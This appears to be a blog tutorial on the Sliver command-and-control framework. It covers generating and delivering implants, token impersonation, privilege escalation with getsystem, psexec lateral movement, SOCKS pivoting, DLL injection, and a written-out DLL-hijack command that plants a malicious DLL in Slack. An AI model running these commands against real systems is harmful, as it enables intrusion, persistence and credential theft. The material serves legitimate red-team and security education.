---
title: "Getting started with the Sliver C2 Framework"
date: 2022-08-29T21:37:49+02:00
draft: false
---

# Getting started with the Sliver C2 Framework

[Sliver](https://github.com/BishopFox/sliver) is an open-source multi-operator command and control framework written in Go and named after [a species from Magic the Gathering](https://github.com/BishopFox/sliver/wiki#sure-but-whats-a-sliver). It is maintained by BishopFox and offers a big feature set and a beautiful CLI.

However, I did not find much documentation on the more advanced features, except for Slivers `help` menu (which is excellent by the way). That is why I document some of its features in this post. The project is actively developed, so the below is subject to change and may not work in future versions of the framework.

Sliver features staged and stageless payloads, implants for Windows, Linux & macOS, malleable C2 over HTTP(S) as well as C2 over mTLS, WireGuard and DNS. It also fits all your basic C2 needs: execute-assembly, socks proxy, port forwarding, you name it. Additionally, an extension management system (armory) offers some additions and customization options. 

IMO Sliver is a great free and open-source replacement for Cobalt Strike.

## Setting up and connecting to the team server

In kali, installation is straightforward via `apt`

```bash
apt install sliver
```

Start the team server and you will be greeted with a Sliver banner.

```bash
sliver-server
```

![](/sliver.png)

Now first we have to create an operator config file. These files contain authentication and connection info for your team server.

```bash
new-operator --name eversinc33 --lhost 127.0.0.1
```

Afterwards, copy your config file to `~/.sliver-client/configs`.

Finally, enable multiplayer mode, to allow operator login:

```bash
multiplayer
```

If you have connection errors with the Sliver-client, it is likely that you forgot to run the above command, as it needs to be run every time you start the server.

To connect to the server as an operator, run `sliver-client` and select your configuration file, if there are multiple.

### Generating Implants

There are many options for generating implants and I recommend to read through them all with `help generate`. Note that by default a `session`-implant is generated, which communicates in a real time fashion. To generate a `beacon` implant, that periodically checks back for tasks, use `generate beacon`. Staged implants can be generated with `generate stager`. All your implants can be listed with `implants` and regenerated with `regenerate IMPLANT_NAME`.

I generated the shellcode for an mTLS-based implant here. Compilation may take some time. 

```bash
generate -N IMPLANT_NAME --mtls 192.168.2.129 -f shellcode -s /tmp/sliver.bin
```

Besides `shellcode`, you can also generate an `exe`, a dynamic library (`shared`) or a `service`to use for `psexec`.

Don't forget to start the listener with, in this case, `mtls`.

If you then deliver and execute the payload using your favorite method, we get a connection back. 

![](/newsesh.png)

## Interacting with a session

We can start to interact with our agent with `use <ID>`. List available sessions and beacons with `sessions` and `beacons` respectively:

![](/listsessions.png)

Sliver has many powerful features. If you type `help` in a session, you can see a list of all of them. If you have experience working with Cobalt Strike or meterpreter, many of them will be familiar, which makes Sliver feel quite "natural" and have an easy learning curve. 

There are many basic commands available, such as `upload` and `download`, `ls` and `cd`, `cat`, `execute` (run any shell command), `netstat` or `screenshot`. 

Below are some further examples of selected Sliver commands. 

## Commands 

```
execute-assembly 
```

> With `execute-assembly` we can run a .NET assembly (DLL or exe) in memory, by spawning a new process (notepad by default) that hosts the .NET-CLR. With the `-X` flag, the tool output is automatically saved to `~/.sliver/loot`.

> This can however be a bit tedious, since as of now there is no path autocompletion, but that is not that much of a problem when working with aliases, which I will explain at the end..

```
getsystem
```

> Spawn a new session as NT AUTHORITY/SYSTEM, by injecting into a system process when you are already in a high privileged shell.

> ![](/getsystem.png)

```
ps
```

> List processes and identify running security products such as AVs and EDRs:

> ![](/ps.png)

```
socks
```

> Sliver enables you to start a socks5 proxy in your implant with `socks5 start`. This proxy can then be used with e.g. `proxychains` to tunnel your tools through the implant into the corporate network.

``` 
pivots
``` 

> `pivots` offers local listeners, that can link your implants to each other, either via TCP or via SMB named pipes. These pivot listeners and links help you keep your outbound traffic low. SMB blends in very well in Active Directory environments, which is why I would prefer SMB to link between machines. For local links, e.g. when you are privilege escalating and need to spawn another beacon/session, I would use TCP instead.

> Start the pipe listener in your session/beacon and name your pipe (e.g. intercom): `pivots named-pipe intercom`. Then generate a named-pipe implant, e.g. `generate --named-pipe //./pipe/intercom`. Don't forget the pipe prefix here (`//./pipe`).

> Upon launching your implant, if it can reach your other implant, it will link and communicate over that implant to the team server.

> ![](/namedpipe.png)

> This is also really useful if your target can not directly communicate with your team server, e.g. due to firewalls.

```
impersonate
make-token
rev2self
```

> `ìmpersonate` and `make-token` allow you to play around with Windows access tokens. The former allows you to steal the token of another process, if you have the privileges to access it (e.g. when you are SYSTEM on a machine and want the token of another logged-in user). The latter allows you to impersonate a user by forging an access token, if you know the credentials. I don't think there is a command like Cobalt Strike's `kerberos_ticket_use`, where you can inject a kerberos ticket into your session, but maybe that will come (or correct me if I missed it). `rev2self` reverts the token to the original access token of that session.

```
psexec
```

> `psexec` allows you to easily jump to another host by creating a service with psexec (duh). To do that, you need to first create an implant profile with `profiles new`, which acts as a template for the service binary that will be deployed.

```
sideload
```

> Load a DLL into a remote process using [Shellcode Reflective DLL Injection](https://www.netspi.com/blog/technical/adversary-simulation/srdi-shellcode-reflective-dll-injection/). Lets you also capture the output to the loot directory with `-X`.

```
dll-hijack
```

> This might be my favorite command. It allows you to specify a DLL on the host and a local DLL that will be planted on the target.It will then modify all exports so that the planted DLL forwards all relevant exports to the hijacked DLL. Optionally you can also use an implant profile to generate as the DLL.

> E.g., hijack msasn1.dll, which is loaded by slack and supply your own DLL as the malicious replacement: `dll-hijack --reference-path C:\\Windows\\system32\\msasn1.dll --file /tmp/malicious.dll C:\\Users\\Bob\\AppData\\Slack\\App-4.18.0\\msasn1.dll`. Now slack will load your malicious DLL on startup, but functionality won't be impacted, because your DLL is modified to forward all calls to the original DLL.

```
msf
```

> Sliver offer some integration with metasploit, and as such can run MSF payloads (and inject them into remote processes with `msf-inject`) by speaking to a metasploit instance via its RPC API:

> ![](/msf1.png)

> Even though it errors with an empty response, we get back a meterpreter shell:

> ![](/msf.png)

Obviously those are not all commands, but rather some that I found interesting. There are many more so check them out too.

## Extending Sliver

Using armory, Sliver's built-in repository for extensions, we can easily install extensions, such as a keylogger, Beacon-Object-Files or aliases for several well-known .NET-based tools.

Aliases are basically a thin wrapper around `execute-assembly`. As such, instead of having to type out `execute-assembly /path/to/sharphound`, I can now simply type `sharp-hound-3`. 

![](/bloodhound.png)

Aliases for your own tools can be quickly created, as they are just a [json-file that describes the assembly](https://github.com/BishopFox/sliver/blob/928faad39a07e999bb67d4d66054052387342f5c/client/command/exec/msf-inject.gos).

Another way to use armory is that you as a team could set up your own armory-repository that includes your internal tooling and that can be used by all operators.

## Other takeaways

* Sliver does not always take you by the hand, e.g. if you specify `-f dll` for an implant, it does not warn you that this format does not exist and that what you want to use is `-f shared`, it will just generate an .exe file. 

Go and play with Sliver at https://github.com/BishopFox/Sliver. Happy Hacking
